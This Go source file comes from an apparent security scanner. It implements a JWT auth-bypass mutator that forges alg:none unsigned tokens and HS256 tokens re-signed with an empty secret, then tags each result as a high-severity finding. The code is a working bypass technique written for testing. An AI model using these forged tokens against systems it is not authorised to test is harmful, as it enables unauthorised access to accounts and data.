package mutate

// jwt_auth.go implements the --jwt-attack mutator (POST_V01 Item 4).
//
// Where the existing identity-swap mutators attack *who* the token claims
// to be, this mutator attacks the *token itself* — the two most common
// real-world JWT verification misconfigurations:
//
//	1. alg:none      — the verifier honours an unsigned token because it
//	                   trusts the header's `alg` field. We rewrite the
//	                   header to {"alg":"none","typ":"JWT"}, drop the
//	                   signature, and send "<header>.<payload>.".
//	2. blank-secret  — the verifier was configured with an empty HMAC key
//	                   (a common copy-paste / default-config bug). We
//	                   re-sign the original claims with HS256 and the empty
//	                   string "" as the key.
//
// Both are auth bypasses: a successful response means the server accepted
// a token an attacker can forge with no knowledge of the real signing key.
//
// The mutator is gated behind --jwt-attack (Enabled). Auth mutation is
// noisier than identity swap — it forges tokens rather than replaying real
// ones — so it stays off by default, mirroring the EnumerateID (N==0)
// gating pattern. When Enabled is false, Generate returns nil immediately
// and the mutator is a no-op even though it is registered.
//
// Unlike the deeper P5 JWT suite, this mutator deliberately keeps to the
// two highest-signal, lowest-noise attacks and tags each finding with a
// stable, human-facing identifier (POSSESSION-JWT-NONE /
// POSSESSION-JWT-BLANK-SECRET) so reports and triage are unambiguous.

import (
	jwthelper "github.com/bugsyhewitt/possession/internal/jwt"
	"github.com/bugsyhewitt/possession/internal/model"
)

// Canonical, human-facing finding identifiers emitted by this mutator.
// These flow through to the finding via Mutation.Detail["finding_id"] and
// are surfaced in reporters. Severity is pinned HIGH for both (see
// detect.SeverityOverrideByMutator).
const (
	FindingJWTNone        = "POSSESSION-JWT-NONE"
	FindingJWTBlankSecret = "POSSESSION-JWT-BLANK-SECRET"
)

// Mutation type strings for the two auth-bypass variants. Kept distinct
// from the existing jwt-alg-none mutator so the two code paths never
// collide in reports or class/severity lookup.
const (
	mutTypeJWTAuthNone  = "jwt-attack-none"
	mutTypeJWTAuthBlank = "jwt-attack-blank-secret"
)

// JWTAuth is the --jwt-attack mutator. It forges two auth-bypass token
// variants per captured JWT location: an alg:none unsigned token and an
// HS256 token re-signed with an empty secret.
//
// Generate is pure and deterministic: same inputs ⇒ same output slice
// (including order), so --dry-run and the offline corpus cover it.
type JWTAuth struct {
	// Enabled gates the mutator. False ⇒ Generate returns nil. Set from
	// the --jwt-attack CLI flag. Default-zero (false) keeps the mutator
	// inert even when registered, matching EnumerateID's N==0 pattern.
	Enabled bool
}

// Name implements Mutator.
func (JWTAuth) Name() string { return "jwt-attack" }

// Generate implements Mutator. For each JWT-shaped token carried in the
// request (Authorization: Bearer, auth-like headers, auth cookies, or
// top-level JSON body token fields — whatever jwt.Detect finds), it emits
// up to two variants:
//
//	[0] alg:none   — header {"alg":"none","typ":"JWT"}, signature dropped
//	[1] blank-secret — HS256 re-sign of the original claims with key ""
//
// Locations whose token cannot be re-encoded are skipped silently (a
// request without a usable JWT is not a JWT bug surface).
func (j JWTAuth) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	if !j.Enabled || base == nil {
		return nil
	}
	locs := jwthelper.Detect(base)
	if len(locs) == 0 {
		return nil
	}

	out := make([]model.Variant, 0, len(locs)*2)
	for _, loc := range locs {
		// ── Variant 1: alg:none ───────────────────────────────────────
		// Rewrite the header to exactly {"alg":"none","typ":"JWT"} and
		// drop the signature, producing "<header>.<payload>.".
		noneHdr := map[string]any{"alg": "none", "typ": "JWT"}
		if noneTok, err := jwthelper.Encode(noneHdr, loc.Claims, ""); err == nil {
			if req := replaceToken(base, loc, noneTok); req != nil {
				out = append(out, makeJWTVariant(req, loc, mutTypeJWTAuthNone,
					"rewrite header to alg:none and drop signature (unsigned-token bypass)",
					"authn-bypass",
					map[string]string{
						"attack":     "alg-none",
						"finding_id": FindingJWTNone,
						"severity":   "high",
					}))
			}
		}

		// ── Variant 2: blank-secret ───────────────────────────────────
		// Re-sign the original header+claims with HS256 using "" as the
		// HMAC key. EnsureHS256 alg so the token is internally consistent
		// with the empty-key signature.
		blankHdr := copyHeader(loc.Header)
		blankHdr["alg"] = "HS256"
		if blankTok, err := jwthelper.EncodeWithHS256(blankHdr, loc.Claims, ""); err == nil {
			if req := replaceToken(base, loc, blankTok); req != nil {
				out = append(out, makeJWTVariant(req, loc, mutTypeJWTAuthBlank,
					"re-sign HS256 with empty-string secret (blank-key bypass)",
					"authn-bypass",
					map[string]string{
						"attack":      "blank-secret",
						"hmac_secret": "",
						"finding_id":  FindingJWTBlankSecret,
						"severity":    "high",
					}))
			}
		}
	}
	return out
}
